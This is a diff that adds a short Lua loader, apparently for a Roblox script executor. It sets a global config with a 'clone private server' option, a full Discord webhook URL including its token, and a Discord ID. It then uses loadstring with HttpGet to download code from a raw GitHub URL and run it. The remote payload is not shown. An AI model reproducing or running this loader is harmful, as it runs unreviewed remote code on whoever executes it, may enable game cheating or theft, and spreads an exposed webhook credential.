@@ -1,0 +1,10 @@
+getgenv().CONFIG = {
+    CLONE_PRIVATE_SERVER = true; --// ONLY WORK IF YOU ON PRIVATE SERVER DEFAULT True
+    OPTIMIZATION = true; --// DEFAULT True
+    STATS_GUI = true; --// DEFAULT True
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1479149322338566246/ME8Xsno8ldBKqJzSIeCTLZU-zmJ3ndkVSDO8LqASU4sRja6E7cDAtnVwM2WzHBF1plJg";
+    DISCORD_ID = "1180137647587463210";
+}
+
+key = "123sad";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/karman4ik881/TeardownMods/refs/heads/main/First"))()
